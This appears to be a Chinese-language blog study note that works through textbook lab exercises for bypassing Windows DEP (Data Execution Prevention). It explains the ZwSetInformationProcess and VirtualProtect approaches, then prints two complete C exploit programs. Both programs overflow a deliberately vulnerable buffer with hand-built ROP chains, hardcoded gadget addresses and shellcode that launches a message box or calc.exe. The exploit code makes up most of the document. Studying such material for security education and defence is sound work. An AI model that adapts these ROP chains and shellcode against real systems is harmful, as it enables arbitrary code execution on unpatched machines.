---
title: 安全机制 DEP 绕过
tags: [机制,DEP]
categories: 编程

grammar_cjkRuby: true
---

# 0x01 简介
DEP （Data Execution Prevention）数据保护机制，在XP SP3被引入，将地址改为不可执行，使得shellcode无法在指定位置执行。

# 0x02 绕过方法
主要还是了解现有的一些绕过方法，0day漏洞上介绍了几种方法


1. Ret2libc ZwSetInformationProcess
2. Ret2libc VirtualProtect
3. Ret2libc VirtualAlloc
4. 利用可执行内存
5. 利用.NET
6. 利用Java applet 

大体上分为两种
1. 利用可执行内存
2. 直接关闭DEP

![][1]

# 0x03 实验
跟着书上的实验一步一步调吧，主要还是思想，学会思考的过程并不是为了最后的弹框，shellcode直接使用书上提供的健壮的代码


## 0x1 Ret2libc ZwSetInformationProcess
进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API函数 ZwQueryInformationProcess 和 Zw SetInformationProcess 进行查询和修改，所以可以直接将进程的 DEP 保护关闭。


_KEXECUTE_OPTIONS 的结构
``` 
typedef struct _KEXECUTE_OPTIONS
{
UCHAR Value; 
/*
Pos0ExecuteDisable :1bit
Pos1ExecuteEnable :1bit
Pos2DisableThunkEmulation :1bit
Pos3Permanent :1bit
Pos4ExecuteDispatchEnable :1bit
Pos5ImageDispatchEnable :1bit
Pos6Spare :2bit
*/
} KEXECUTE_OPTIONS;
```

了解了_KEXECUTE_OPTIONS的结构就可以用setinformationprocess设置相应的值，只需将第二位设置位1即可，所以关闭DEP的设置为

``` 
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
ZwSetInformationProcess(
NtCurrentProcess(),  // (HANDLE)-1
ProcessExecuteFlags, // 0x22
&ExecuteFlags, 		 // ptr to 0x2
sizeof(ExecuteFlags)); // 0x4
```

Q：这里有个问题为什么不直接传参调用函数执行
A：答案是这里用的strcpy是，如果直接传参那么参数中肯定会有零字节，所以想到了利用现有的函数调用


T：因为微软为兼容性考虑，如果一个进程的 Permanent 位没有设置，当它加载 DLL时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭

这是利用这一个trick，绕过DEP，微软设立了一个函数LdrpCheckNXCompatibility
满足下面三个条件之一就会触发
1. 当 DLL 受 SafeDisc 版权保护系统保护时；
2. 当 DLL 包含有.aspcak、.pcle、.sforce 等字节时；
3. Windows Vista 下面当 DLL 包含在注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions”


T：我们可以利用ollyfindaddr插件寻找关闭DEP的起始位置，同时还有一些其他的辅助地址



![][2]

**shellcode的探索过程**

T：retn x指令可以构造rop链，当然执行过程可以归结为下面一句话，在执行当前语句时他的下一条指令是esp的指向，下下一条指令则是esp+4+x，因此rop链的执行顺序就确定了
> 为了满足第一个条件必须将al设置为1，这里利用了一个rop链，但是接着发现在执行关闭DEP代码的时候ebp地址不可写，所以要在关闭DEP之前将可赋值地址写入ebp中，接着又发现esp不够高使得shellcode的被破坏，所以要抬高esp，下面才是执行DEP，还有一个坑在DEP的最后有一个leave操作所以，最后esp=ebp+4所以在retn的时候是返回到ebp+4的位置我们还记得给ebp赋值吗，没错就是这么巧妙，esp再次回去而且是jmp esp的位置一切都是这么巧妙。看起来是偶然的东西其实都是我们一手安排的。

贴出代码

``` 
#include<stdlib.h> 
#include<string.h> 
#include<stdio.h> 
#include<windows.h> 
char shellcode[]=  
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"  
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"  
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"  
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"  
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"  
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"  
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"  
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"  
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"  
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"  
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN地址  
"\x85\x8B\x1D\x5D"//修正EBP  
//"\x19\x4A\x97\x7C"//增大ESP  
"\x45\x01\x88\x7c"
"\xB4\xC1\xC5\x7D"//jmp esp  
"\x24\xCD\x93\x7C"//关闭DEP代码的起始位置  
"\xE9\x33\xFF\xFF"//回跳指令  
"\xFF\x90\x90\x90"  
;  
void test()  
{  
      char tt[176];  
      strcpy(tt,shellcode);  
}  
int main()  
{  
      HINSTANCE hInst = LoadLibrary("shell32.dll");  
      char temp[200];  
      test();  
      return 0;  
}  
```

或者用

``` 
"\x52\xE2\x92\x7C"//MOV EAX,1 RETN地址 
"\x96\x73\x1B\x5D"//修正EBP 8
"\x85\x8B\x1D\x5D"//ebp 4
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
//"\x19\x4A\x97\x7C"//增大ESP  
"\x45\x01\x88\x7c"//esp up
"\xB4\xC1\xC5\x7D"//jmp esp  
"\x24\xCD\x93\x7C"//关闭DEP代码的起始位置  
"\xE9\x27\xFF\xFF"//回跳指令  
"\xFF\x90\x90\x90"  
```
都是可以的只要是明白了retn的精髓那么构造shellcode就不是问题



## 0x2 VitualProtect

``` 
 
// GS_Virtual.cpp : 定义控制台应用程序的入口点。  
//  
  
#include <stdlib.h>  
#include <string.h>  
#include <stdio.h>  
#include <windows.h>  
char shellcode[]=  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
  
"\x94\xb0\x6c\x7d"   //0x7d6cb094 pop eax  ret  
//"\x34\x7a\xc1\x77"   //POP EBX POP ESI POP EDI  RETN at 0x77c17a34     
//"\x26\x62\x92\x7d" //POP ECX POP ECX POP ECX  RETN at 0x7d926226  
"\x69\x36\x5C\x7D"    // pop edi,pop ebx,pop esi,retn  
"\xe5\xe0\x72\x7d"   //0x7d72e0e5  push esp pop ebp ret 4  
"\x24\x01\x6f\x7d"   //ret   
"\x90\x90\x90\x90"  
"\xc6\xc6\xeb\x77"   //77ebc6c6  push esp jmp eax  
"\x10\x01\x00\x00"   //要修改的内存大小  
"\x40\x00\x00\x00"   //可读可写可执行属性代码  
"\xc6\xc6\xeb\x77"   //77ebc6c6  push esp jmp eax  
  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
"\xD9\x1A\x80\x7C"//修改内存属性  
  
"\x90\x90\x90\x90"  
"\xEB\x30\x5A\x7D"//jmp esp  
  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
"\x90\x90\x90\x90"  
  
"\x90\x90\x90\x90"  
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"  
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"  
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"  
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"  
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"  
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"  
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"  
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"  
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"  
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"  
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"  
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"  
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"  
;  
void test()  
{  
    char tt[176];  
    printf("ttttttttttttttttttttt\n");  
    memcpy(tt,shellcode,sizeof(shellcode) + 1);  
}  
int main()  
{  
    HINSTANCE hInst = LoadLibrary("shell32.dll");  
    char temp[200];  
    test();  
    return 0;  
}  
```





  [1]: ./images/1.png
  [2]: ./images/2.png 
